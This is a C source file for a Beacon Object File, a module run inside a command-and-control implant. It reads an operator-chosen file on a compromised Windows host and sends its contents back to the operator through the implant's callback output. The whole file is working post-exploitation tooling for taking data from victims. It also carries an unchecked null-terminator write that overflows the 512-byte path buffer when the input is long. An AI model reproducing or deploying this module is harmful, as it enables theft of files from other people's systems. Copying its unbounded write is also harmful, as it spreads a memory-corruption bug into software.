#include <windows.h>
#include "../Beacon/include/coff/beacon_compatibility.h"

WINBASEAPI HANDLE WINAPI kernel32$CreateFileA(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
WINBASEAPI BOOL   WINAPI kernel32$ReadFile(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
WINBASEAPI BOOL   WINAPI kernel32$CloseHandle(HANDLE);
WINBASEAPI DWORD  WINAPI kernel32$GetFileSize(HANDLE, LPDWORD);
WINBASEAPI DWORD  WINAPI kernel32$GetLastError(VOID);
WINBASEAPI LPVOID WINAPI kernel32$VirtualAlloc(LPVOID, SIZE_T, DWORD, DWORD);
WINBASEAPI BOOL   WINAPI kernel32$VirtualFree(LPVOID, SIZE_T, DWORD);

void go(char* args, int alen) {
    if (!args || alen <= 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] No file path provided\n");
        return;
    }

    int path_len = alen;
    char path[512];
    for (int i = 0; i < path_len && i < 511; i++) path[i] = args[i];
    path[path_len] = '\0';

    HANDLE hFile = kernel32$CreateFileA(
        path, GENERIC_READ, FILE_SHARE_READ, NULL,
        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    if (hFile == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] CreateFileA failed: %lu\n", kernel32$GetLastError());
        return;
    }

    DWORD fileSize = kernel32$GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE || fileSize == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Invalid file size: %lu\n", kernel32$GetLastError());
        kernel32$CloseHandle(hFile);
        return;
    }

    char* buffer = (char*)kernel32$VirtualAlloc(NULL, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!buffer) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Memory allocation failed\n");
        kernel32$CloseHandle(hFile);
        return;
    }

    DWORD bytesRead = 0;
    if (kernel32$ReadFile(hFile, buffer, fileSize, &bytesRead, NULL)) {
        BeaconOutput(CALLBACK_OUTPUT, buffer, bytesRead);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] ReadFile failed: %lu\n", kernel32$GetLastError());
    }

    kernel32$VirtualFree(buffer, 0, MEM_RELEASE);
    kernel32$CloseHandle(hFile);
}
